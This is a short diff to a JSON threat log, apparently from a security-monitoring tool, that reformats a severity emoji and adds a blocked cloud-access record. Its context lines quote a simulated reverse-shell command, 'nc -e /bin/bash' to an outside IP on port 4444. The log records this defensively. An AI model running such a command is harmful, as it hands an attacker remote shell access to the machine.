@@ -7,7 +7,15 @@
     "threat_type": "REVERSE_SHELL_ATTACK",
     "cmdline": "nc -e /bin/bash 198.51.100.44 4444 (Simulated Attack Neutralized)",
     "action_taken": "IMMEDIATE_TERMINATION",
-    "severity": "CRITICAL \ud83d\udea8",
+    "severity": "CRITICAL 🚨",
     "simulated": true
+  },
+  {
+    "threat_id": "THREAT-CLOUD-1793208837",
+    "timestamp": "2026-10-28 23:03:57",
+    "source": "unauthorized_hacker",
+    "threat_type": "UNAUTHORIZED_CLOUD_ACCESS_ATTEMPT",
+    "action_taken": "BLOCKED_AND_ALERTED",
+    "enforced_by": "Aradhya Cloud Security Guard"
   }
 ]
